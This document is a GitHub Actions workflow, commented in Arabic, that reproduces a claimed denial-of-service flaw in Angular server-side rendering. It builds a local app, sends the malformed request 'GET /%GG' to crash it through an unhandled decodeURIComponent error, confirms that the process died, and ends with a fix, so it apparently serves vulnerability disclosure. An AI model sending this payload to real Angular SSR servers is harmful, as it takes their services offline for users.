name: Angular SSR DoS PoC — URIError in ServerRouter.match()

on:
  workflow_dispatch:  # تشغيل يدوي من GitHub UI

jobs:
  poc:
    name: Reproduce URIError DoS
    runs-on: ubuntu-latest
    timeout-minutes: 10

    steps:
      # ── 1. تحميل الكود ──────────────────────────────────────────
      - name: Checkout repository
        uses: actions/checkout@v4

      # ── 2. إعداد Node.js ────────────────────────────────────────
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 20

      # ── 3. تثبيت Angular CLI ────────────────────────────────────
      - name: Install Angular CLI
        run: npm install -g @angular/cli --quiet

      # ── 4. إنشاء Angular SSR app ────────────────────────────────
      - name: Create minimal Angular SSR app
        run: |
          ng new ssr-poc \
            --ssr \
            --defaults \
            --skip-git \
            --style css
        working-directory: /tmp

      # ── 5. بناء الـ app ─────────────────────────────────────────
      - name: Build Angular SSR app
        run: npm run build
        working-directory: /tmp/ssr-poc

      # ── 6. تشغيل الـ SSR server في الخلفية ──────────────────────
      - name: Start SSR server (background)
        run: |
          node dist/ssr-poc/server/server.mjs &
          echo "SERVER_PID=$!" >> $GITHUB_ENV
          sleep 5  # انتظر حتى يبدأ الـ server
        working-directory: /tmp/ssr-poc

      # ── 7. التأكد إن الـ server شغال قبل الهجوم ────────────────
      - name: Verify server is running (normal request)
        run: |
          echo "Testing normal request first..."
          curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" \
            http://localhost:4000/ || true

      # ── 8. إرسال الـ malformed request (الهجوم) ─────────────────
      - name: Send malformed percent-encoded request
        id: attack
        run: |
          echo "============================================"
          echo "Sending malicious request: GET /%GG"
          echo "============================================"

          # إرسال الـ request الخبيث
          curl -v "http://localhost:4000/%GG" 2>&1 || true

          # انتظر قليلاً
          sleep 2

          echo "============================================"
          echo "Checking if server is still alive..."
          echo "============================================"

          # هل الـ server لا يزال يرد؟
          if curl -s --max-time 3 http://localhost:4000/ > /dev/null 2>&1; then
            echo "RESULT=alive" >> $GITHUB_ENV
            echo "⚠️  Server still responding (framework caught the error)"
          else
            echo "RESULT=crashed" >> $GITHUB_ENV
            echo "💥 SERVER CRASHED — DoS confirmed!"
          fi

      # ── 9. محاولة إرسال request ثاني (لإثبات الـ DoS) ──────────
      - name: Attempt follow-up request (proves unavailability)
        run: |
          echo "Sending follow-up request to confirm DoS..."
          HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
            --max-time 3 http://localhost:4000/ 2>/dev/null || echo "000")

          echo "HTTP response code: $HTTP_CODE"

          if [ "$HTTP_CODE" = "000" ]; then
            echo "✅ CONFIRMED: Server is unreachable — DoS successful"
          else
            echo "⚠️  Server returned $HTTP_CODE"
          fi

      # ── 10. فحص الـ Node.js process مباشرة ─────────────────────
      - name: Check if server process is still alive
        run: |
          if kill -0 $SERVER_PID 2>/dev/null; then
            echo "Process $SERVER_PID is still running"
          else
            echo "💥 Process $SERVER_PID has DIED — crash confirmed!"
            echo "This proves the unhandled URIError terminated the Node.js process."
          fi

      # ── 11. إثبات الـ root cause مباشرة ─────────────────────────
      - name: Prove root cause in Node.js REPL
        run: |
          node - << 'EOF'
          console.log("=== Root Cause Proof ===\n");

          // URL constructor لا يرمي error
          try {
            const url = new URL("http://localhost/%GG");
            console.log("✅ new URL('http://localhost/%GG') succeeded");
            console.log("   pathname =", url.pathname);
          } catch (e) {
            console.log("❌ URL constructor threw:", e.message);
          }

          console.log("");

          // decodeURIComponent يرمي URIError
          try {
            decodeURIComponent("%GG");
            console.log("✅ decodeURIComponent('%GG') succeeded (unexpected)");
          } catch (e) {
            console.log("💥 decodeURIComponent('%GG') threw:", e.constructor.name);
            console.log("   Message:", e.message);
            console.log("\n→ This is exactly what crashes ServerRouter.match()");
            console.log("→ File: packages/angular/ssr/src/routes/router.ts:64");
          }
          EOF

      # ── 12. تلخيص النتيجة ───────────────────────────────────────
      - name: Summary
        run: |
          echo "============================================"
          echo "VULNERABILITY SUMMARY"
          echo "============================================"
          echo "CVE Type  : CWE-248 Uncaught Exception → DoS"
          echo "Vector    : Network / Unauthenticated"
          echo "Payload   : GET /%GG HTTP/1.1"
          echo "Root cause: decodeURIComponent() without try/catch"
          echo "File      : packages/angular/ssr/src/routes/router.ts:64"
          echo "Fix       : Wrap decodeURIComponent in try/catch → return undefined"
          echo "============================================"
